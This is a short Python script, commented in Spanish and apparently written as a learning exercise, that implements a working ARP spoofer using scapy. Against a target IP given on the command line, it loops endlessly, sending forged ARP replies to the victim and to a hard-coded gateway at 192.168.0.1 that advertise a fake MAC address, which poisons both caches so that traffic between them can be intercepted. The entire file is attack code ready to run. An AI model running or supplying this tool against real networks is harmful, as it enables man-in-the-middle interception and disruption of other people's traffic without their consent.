import argparse
import sys
import time
import scapy.all as scapy
import signal
# Función que maneja la señal SIGINT (cuando presionas CTRL + C)
def def_handler(sig, frame):
    print("Saliendo..\n")
    sys.exit(1)
# Registrar la función def_handler como manejador para CTRL + C
signal.signal(signal.SIGINT, def_handler)

# Función para manejar argumentos por consola
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")

    # Parámetro obligatorio: dirección IP o rango de IPs víctima
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range  to spoof")

    return parser.parse_args()

# Función que envía un paquete ARP falso para engañar a la víctima
def spoof(ip_address, spoof_ip):
    # op=2 significa ARP Reply (respuesta)
    # psrc = IP que queremos suplantar
    # pdst = IP de la víctima
    # hwsrc = dirección MAC falsa que queremos mostrar
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip,pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # MAC que quieres usar
    # Enviar el paquete ARP sin mostrar información innecesaria
    scapy.send(arp_packet, verbose = False)

def main():
    arguments = get_arguments() # Obtener argumentos de línea de comandos

    # Bucle infinito para enviar ARP Spoofing constantemente
    # Esto mantiene la "mentira" viva en la cache ARP
    while True:
        # Engañar a la víctima haciéndole creer que somos el gateway
        spoof(arguments.ip_address, "192.168.0.1")
        # Engañar al gateway haciéndole creer que somos la víctima
        spoof("192.168.0.1",arguments.ip_address)

        time.sleep(2)        # Esperar 2 segundos entre envíos para mantener estable el spoofing


# Punto de inicio del script
if __name__ =='__main__':
    main()
